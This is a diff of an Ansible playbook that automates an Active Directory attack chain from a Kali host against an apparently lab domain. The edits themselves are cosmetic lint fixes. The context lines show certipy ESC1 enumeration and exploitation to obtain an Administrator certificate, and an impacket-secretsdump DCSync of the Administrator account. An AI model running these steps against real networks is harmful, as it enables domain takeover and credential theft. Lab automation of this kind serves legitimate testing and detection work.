@@ -1,5 +1,5 @@
 ---
-- name: "slopMop | Attack chain — Linux steps from Kali"
+- name: "SlopMop | Attack chain — Linux steps from Kali"
   hosts: kali
   become: false
   gather_facts: false
@@ -17,6 +17,7 @@
   tasks:
     - name: "Step 04 | certipy find — ESC1 enumeration"
       ansible.builtin.shell: |
+        set -o pipefail
         certipy find \
           -u '{{ dcsync_user }}@{{ suna_domain }}' \
           -p '{{ dcsync_pass }}' \
@@ -32,6 +33,7 @@
 
     - name: "Step 05 | certipy req — ESC1 exploitation (request cert as Administrator)"
       ansible.builtin.shell: |
+        set -o pipefail
         certipy req \
           -u '{{ dcsync_user }}@{{ suna_domain }}' \
           -p '{{ dcsync_pass }}' \
@@ -50,6 +52,7 @@
 
     - name: "Step 06 | secretsdump — DCSync via svc_adsync"
       ansible.builtin.shell: |
+        set -o pipefail
         impacket-secretsdump \
           '{{ suna_domain }}/{{ dcsync_user }}:{{ dcsync_pass }}@{{ suna_dc }}' \
           -just-dc-user 'SUNAGAKURE\Administrator' \
@@ -111,14 +114,14 @@
       changed_when: false
 
     - name: List captured evidence on kali
-      ansible.builtin.shell: ls -la {{ cap }}/
+      ansible.builtin.command: ls -la {{ cap }}/
       register: kali_evidence
       changed_when: false
     - name: Show kali evidence
       ansible.builtin.debug:
         var: kali_evidence.stdout_lines
 
-- name: "slopMop | Attack chain — Windows steps from WS01"
+- name: "SlopMop | Attack chain — Windows steps from WS01"
   hosts: konoha-ws1
   gather_facts: false
   vars:
